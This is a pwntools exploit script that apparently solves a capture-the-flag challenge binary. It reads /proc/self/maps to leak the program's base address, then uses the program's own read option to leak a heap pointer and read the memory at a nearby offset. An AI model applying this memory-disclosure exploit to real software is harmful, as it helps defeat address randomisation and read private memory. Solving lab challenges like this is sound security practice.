from pwn import *

exe = ELF("./capture_the_flaaaaaaaaaaaaag")

p = process("./capture_the_flaaaaaaaaaaaaag")
# gdb.attach(p)

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"> ", b"")

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"> ", b"/proc/self/maps")
exe.address = int(p.recvuntil(b"-", drop=True), 16)
success(f"{exe.address=:x}")

feedback = exe.address + 0x4050
p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", str(hex(feedback)).encode())

heap_leak = u64(p.recvline().strip().ljust(8, b"\x00"))
success(f"{heap_leak=:x}")

p.sendlineafter(b"> ", b"2")
p.sendlineafter(b"> ", str(hex(heap_leak+5)).encode())

p.interactive()

